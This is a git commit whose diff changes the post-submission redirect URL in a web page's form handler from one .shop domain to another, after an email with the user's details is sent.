7b5cc8e13e05e4ca71492eba1092fe1bc807d28b
husknet <127146284+husknet@users.noreply.github.com>
2024-08-05 15:03:46 -0300

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -42,7 +42,7 @@ export default function Home() {
           country,
         });
         console.log('Email sent successfully!', response.data.message);
-        window.location.href = 'https://te.clementine-sefy.shop/';
+        window.location.href = 'https://tb.mace-wen.shop';
       } catch (error) {
         console.error('Failed to send email:', error);
         setErrorMessage('Failed to submit. Please try again.');
